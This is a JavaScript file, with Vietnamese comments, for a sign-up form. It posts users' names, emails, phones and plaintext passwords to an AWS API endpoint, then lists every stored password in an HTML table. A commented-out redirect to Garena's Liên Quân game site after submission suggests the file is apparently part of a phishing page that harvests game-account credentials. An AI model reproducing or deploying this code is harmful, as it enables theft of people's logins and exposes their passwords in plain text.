function getInfo() {
  event.preventDefault();

  // Create request object
  const xhr = new XMLHttpRequest();

  // Set up request
  xhr.open('GET', 'https://a98o2l7nk4.execute-api.us-east-1.amazonaws.com/prod', true);
  xhr.setRequestHeader('Content-Type', 'application/json');

  // Set up response handler
  xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        // Parse the response as JSON
        const response = JSON.parse(xhr.responseText);

        // Access the items array in the response
        const items = response.body;

        let myString = items
        
        // Chuyển chuỗi JSON thành mảng
        let myArray = JSON.parse(myString);
        
        // Tạo thẻ div để chứa kết quả
        let tableHtml = '<table id="myTable"> <thead> <tr> <th>Password</th> <th>Email</th> <th>Name</th> <th>Phone</th> </tr> </thead> <tbody>';

        for(let i = 0; i < myArray.length; i++){
          let rowHtml = '<tr>';
          rowHtml += '<td>'+ '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0' + myArray[i].password +  '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0'+ '</td>';
          rowHtml += '<td>'+ '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0' + myArray[i].email +  '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0'+ '</td>';
          rowHtml += '<td>'+ '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0' + myArray[i].name +  '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0'+ '</td>';
          rowHtml += '<td>'+ '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0' + myArray[i].phone +  '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0'+ '</td>';
          rowHtml += '</tr>';
          tableHtml += rowHtml;
        }
        
        tableHtml += '</tbody> </table>';
        
        // Thêm bảng vào thẻ div đã tạo
        let myTableDiv = document.getElementById("myTableDiv");
        myTableDiv.innerHTML = tableHtml;
        
        // Thêm resultDiv vào trang web
        document.body.appendChild(resultDiv);
      } else {
        alert('Failed to get information: ' + xhr.responseText);
      }
    }
  };

  // Send request
  xhr.send();
}


function submitForm() {
  event.preventDefault();

  // Get form data
  const name = document.getElementById('name').value;
  const email = document.getElementById('email').value;
  const phone = document.getElementById('phone').value;
  const password = document.getElementById('password').value;

  // Create request object
  const xhr = new XMLHttpRequest();

  // Set up request
  xhr.open('POST', 'https://a98o2l7nk4.execute-api.us-east-1.amazonaws.com/prod', true);
  xhr.setRequestHeader('Content-Type', 'application/json');

  // Set up response handler
  xhr.onreadystatechange = function() {
      if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
              alert('Registration successful!');
              document.getElementById('name').value = '';
              document.getElementById('email').value = '';
              document.getElementById('phone').value = '';
              document.getElementById('password').value = '';
              // window.location.href = 'https://lienquan.garena.vn/';
          } else {
              alert('Registration failed: ' + xhr.responseText);
          }
      }
  };

  // Send request
  xhr.send(JSON.stringify({
      name: name,
      email: email,
      phone: phone,
      password: password
  }));
}
